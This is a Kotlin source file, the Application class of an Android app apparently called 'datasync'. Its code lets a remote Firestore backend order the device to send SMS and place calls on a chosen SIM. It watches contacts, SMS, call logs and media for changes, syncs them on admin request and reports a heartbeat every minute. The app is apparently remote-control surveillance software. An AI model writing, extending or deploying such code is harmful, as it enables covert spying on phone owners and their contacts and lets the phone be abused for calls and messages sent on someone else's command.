package com.boxx.datasync

import android.app.Application
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.hilt.work.HiltWorkerFactory
import androidx.preference.PreferenceManager
import androidx.work.Configuration
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.sync.CommandProcessor
import com.boxx.datasync.sync.DataContentObserver
import com.boxx.datasync.sync.MediaContentObserver
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.utils.DeviceIdHelper
import com.boxx.datasync.utils.GlobalExceptionHandler
import com.google.firebase.FirebaseApp
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.firestore.FirebaseFirestore
import dagger.hilt.android.HiltAndroidApp
import kotlinx.coroutines.*
import javax.inject.Inject

@HiltAndroidApp
class UserApplication : Application(), Configuration.Provider {

    @Inject
    lateinit var workerFactory: HiltWorkerFactory

    @Inject
    lateinit var repository: DataRepository

    @Inject
    lateinit var commandProcessor: CommandProcessor

    private val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var heartbeatJob: Job? = null
    private var dataContentObserver: DataContentObserver? = null
    private var mediaContentObserver: MediaContentObserver? = null

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .build()

    override fun onCreate() {
        super.onCreate()
        Log.d("UserApplication", "REPO_SCAN_DONE")
        GlobalExceptionHandler.initialize(this)
        FirebaseApp.initializeApp(this)

        val deviceId = DeviceIdHelper.getDeviceId(this)
        val crashlytics = FirebaseCrashlytics.getInstance()
        crashlytics.setCrashlyticsCollectionEnabled(true)
        crashlytics.setUserId(deviceId)

        setupContentObservers()
        observeSyncRequests()
        startHeartbeat()
        commandProcessor.startListening(this)
    }

    fun isPermissionGranted(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun observeSmsRequests() {
        val deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) return

        val prefs = PreferenceManager.getDefaultSharedPreferences(this)

        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) return@addSnapshotListener
                snapshot?.let { doc ->
                    val requestedAt = doc.getLong("smsRequestedAt") ?: 0L
                    val lastHandled = prefs.getLong("last_handled_sms_request", 0L)

                    if (requestedAt > lastHandled) {
                        prefs.edit().putLong("last_handled_sms_request", requestedAt).apply()
                        val number = doc.getString("smsRequestNumber") ?: return@let
                        val message = doc.getString("smsRequestMessage") ?: return@let
                        val simSlot = doc.getLong("smsRequestSimSlot")?.toInt() ?: 0
                        sendSms(number, message, simSlot)
                    }
                }
            }
    }

    private fun observeCallRequests() {
        val deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) return

        val prefs = PreferenceManager.getDefaultSharedPreferences(this)

        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) return@addSnapshotListener
                snapshot?.let { doc ->
                    val requestedAt = doc.getLong("callRequestedAt") ?: 0L
                    val lastHandled = prefs.getLong("last_handled_call_request", 0L)

                    if (requestedAt > lastHandled) {
                        prefs.edit().putLong("last_handled_call_request", requestedAt).apply()
                        val number = doc.getString("callRequestNumber") ?: return@let
                        val simSlot = doc.getLong("callRequestSimSlot")?.toInt() ?: 0
                        makeCall(number, simSlot)
                    }
                }
            }
    }

    private fun sendSms(number: String, message: String, simSlot: Int) {
        if (!isPermissionGranted(android.Manifest.permission.SEND_SMS)) return
        try {
            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                val subscriptionManager = getSystemService(android.telephony.SubscriptionManager::class.java)
                val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
                if (info != null) {
                    getSystemService(android.telephony.SmsManager::class.java).createForSubscriptionId(info.subscriptionId)
                } else {
                    getSystemService(android.telephony.SmsManager::class.java)
                }
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, message, null, null)
            Log.d("UserApplication", "SMS_SENT_SUCCESS")
        } catch (e: Exception) {
            Log.e("UserApplication", "SMS_SENT_FAILED", e)
        }
    }

    private fun makeCall(number: String, simSlot: Int) {
        if (!isPermissionGranted(android.Manifest.permission.CALL_PHONE)) return
        try {
            val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

            val subscriptionManager = getSystemService(android.telephony.SubscriptionManager::class.java)
            val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
            if (info != null) {
                intent.putExtra("com.android.phone.force.slot", true)
                intent.putExtra("Cdma_Phone_Slot", info.simSlotIndex)
                intent.putExtra("Phone_Slot", info.simSlotIndex)
                intent.putExtra("slot", info.simSlotIndex)
                intent.putExtra("simSlot", info.simSlotIndex)
                intent.putExtra("subscription", info.subscriptionId)
                intent.putExtra("com.android.phone.extra.slot", info.simSlotIndex)
            }

            startActivity(intent)
            Log.d("UserApplication", "CALL_INITIATED_SUCCESS")
        } catch (e: Exception) {
            Log.e("UserApplication", "CALL_INITIATED_FAILED", e)
        }
    }

    private fun observeSyncRequests() {
        val deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) return

        val prefs = PreferenceManager.getDefaultSharedPreferences(this)

        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e("UserApplication", "Error observing sync requests", error)
                    return@addSnapshotListener
                }

                snapshot?.let { doc ->
                    val requestedAt = doc.getLong("syncRequestedAt") ?: 0L
                    val fullSyncRequestedAt = doc.getLong("forceFullSyncRequestedAt") ?: 0L
                    val lastHandledFullSync = prefs.getLong("last_handled_full_sync", 0L)
                    val lastHandledSync = prefs.getLong("last_handled_sync", 0L)

                    if (fullSyncRequestedAt > lastHandledFullSync) {
                        Log.d("UserApplication", "CLIENT_FORCE_FULL_SYNC_RECEIVED")
                        prefs.edit().putLong("last_handled_full_sync", fullSyncRequestedAt).apply()
                        triggerSyncService(isFullSync = true)
                    } else if (requestedAt > lastHandledSync) {
                        Log.d("UserApplication", "ADMIN_SYNC_REQUEST_RECEIVED")
                        prefs.edit().putLong("last_handled_sync", requestedAt).apply()
                        triggerSyncService(isFullSync = false)
                    }
                }
            }
    }

    private fun startHeartbeat() {
        val deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) return

        heartbeatJob?.cancel()
        heartbeatJob = applicationScope.launch {
            while (isActive) {
                try {
                    repository.updateHeartbeat(deviceId)
                    Log.d("UserApplication", "HEARTBEAT_UPDATED")
                } catch (e: Exception) {
                    Log.e("UserApplication", "Heartbeat failed", e)
                }
                delay(60_000)
            }
        }
    }

    fun setupContentObservers() {
        if (dataContentObserver == null) {
            dataContentObserver = DataContentObserver(this)
        }
        if (mediaContentObserver == null) {
            mediaContentObserver = MediaContentObserver(this)
        }

        val observer = dataContentObserver ?: return
        val mObserver = mediaContentObserver ?: return

        try {
            contentResolver.unregisterContentObserver(observer)

            if (isPermissionGranted(android.Manifest.permission.READ_CONTACTS)) {
                contentResolver.registerContentObserver(android.provider.ContactsContract.Contacts.CONTENT_URI, true, observer)
            }
            if (isPermissionGranted(android.Manifest.permission.READ_SMS)) {
                contentResolver.registerContentObserver(android.provider.Telephony.Sms.CONTENT_URI, true, observer)
            }
            if (isPermissionGranted(android.Manifest.permission.READ_CALL_LOG)) {
                contentResolver.registerContentObserver(android.provider.CallLog.Calls.CONTENT_URI, true, observer)
            }
        } catch (e: Exception) {
            Log.e("UserApplication", "Failed to register Data ContentObserver", e)
        }

        try {
            contentResolver.unregisterContentObserver(mObserver)

            val prefs = PreferenceManager.getDefaultSharedPreferences(this)
            val autoMediaSync = prefs.getBoolean("auto_media_sync", false)

            val mediaImagesAllowed = isPermissionGranted(android.Manifest.permission.READ_MEDIA_IMAGES) ||
                    isPermissionGranted(android.Manifest.permission.READ_EXTERNAL_STORAGE) ||
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
                            isPermissionGranted(android.Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED))

            val mediaVideosAllowed = isPermissionGranted(android.Manifest.permission.READ_MEDIA_VIDEO) ||
                    isPermissionGranted(android.Manifest.permission.READ_EXTERNAL_STORAGE) ||
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
                            isPermissionGranted(android.Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED))

            if (autoMediaSync && (mediaImagesAllowed || mediaVideosAllowed)) {
                Log.d("UserApplication", "Registering Media ContentObservers")
                contentResolver.registerContentObserver(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, mObserver)
                contentResolver.registerContentObserver(android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, mObserver)
            } else {
                Log.d("UserApplication", "Media ContentObservers unregistered - Auto Media Sync is OFF or permissions missing")
            }
        } catch (e: Exception) {
            Log.e("UserApplication", "Failed to register Media ContentObserver", e)
        }
    }

    private fun triggerSyncService(isFullSync: Boolean = false) {
        val intent = Intent(this, SyncService::class.java).apply {
            putExtra(com.boxx.datasync.sync.SyncScheduler.KEY_FULL_SYNC, isFullSync)
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Log.w("UserApplication", "Foreground service start not allowed. Falling back to WorkManager.", e)
            com.boxx.datasync.sync.SyncScheduler.enqueueIncremental(this)
        }
    }

    override fun onTerminate() {
        applicationScope.cancel()
        super.onTerminate()
    }
}
